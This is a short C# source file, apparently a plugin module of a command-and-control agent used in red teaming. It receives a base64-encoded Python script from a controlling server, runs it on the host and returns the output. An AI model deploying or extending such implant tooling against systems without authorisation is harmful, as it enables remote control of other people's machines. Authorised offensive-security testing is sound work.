using Agent.Interfaces;
using System.Text.Json;
using Agent.Models;
using Agent.Utilities;

namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "python-exec";
        private IMessageManager messageManager { get; set; }
        private IPythonManager pythonManager { get; set; }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
        {
            this.messageManager = messageManager;
            this.pythonManager = pythonManager;
        }

        public async Task Execute(ServerJob job)
        {
            PythonExecArgs pyArgs = JsonSerializer.Deserialize<PythonExecArgs>(job.task.parameters);
            if(pyArgs is null)
            {
                await messageManager.AddResponse(new TaskResponse()
                {
                    task_id = job.task.id,
                    user_output = "Failed to parse args.",
                    completed = true
                });
                return;
            }
            Console.WriteLine(pyArgs.args);
            byte[] scriptBytes = Misc.Base64DecodeToByteArray(pyArgs.file);
            string scriptContents = Misc.GetEncoding(scriptBytes).GetString(scriptBytes);
            string[] argv = Misc.SplitCommandLine(pyArgs.args);

            await messageManager.AddResponse(new TaskResponse()
            {
                task_id = job.task.id,
                user_output = pythonManager.ExecuteScript(scriptContents, argv),
                completed = true
            });
        }
    }
}
